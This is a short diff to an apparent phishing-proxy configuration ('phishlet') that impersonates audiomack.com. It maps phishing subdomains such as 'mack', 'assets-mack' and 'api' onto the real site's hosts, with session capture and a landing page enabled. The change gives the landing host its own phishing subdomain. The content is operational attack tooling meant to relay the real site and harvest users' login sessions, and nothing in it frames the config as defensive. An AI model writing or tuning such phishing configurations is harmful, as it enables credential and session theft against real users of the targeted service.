@@ -5,7 +5,7 @@ redirect_url: 'https://audiomack.com'
 
 
 proxy_hosts:
-  - {phish_sub: '', orig_sub: '', domain: 'audiomack.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'mack', orig_sub: '', domain: 'audiomack.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'assets-mack', orig_sub: 'assets', domain: 'audiomack.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'api', orig_sub: 'api', domain: 'audiomack.com', session: true, is_landing: false, auto_filter: true} 
 
